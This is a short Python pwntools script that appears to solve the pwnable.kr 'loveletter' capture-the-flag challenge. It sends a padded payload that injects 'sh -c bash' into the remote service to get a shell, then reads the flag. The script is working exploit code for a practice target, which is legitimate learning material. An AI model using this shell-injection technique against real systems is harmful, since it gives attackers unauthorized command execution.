from pwn import *

context(log_level="debug" )
p=remote('pwnable.kr', 9034)
#p = process('./loveletter')

input("::::::")

sh = 'sh -c bash '
add_size= "|"
end = '\x00'
payload = sh + 'A' * (256 - len(sh) -len(add_size) - len(end) -1 ) +  add_size + end


p.sendline(payload)
sleep(0.5)
p.sendline("cat flag")
p.interactive()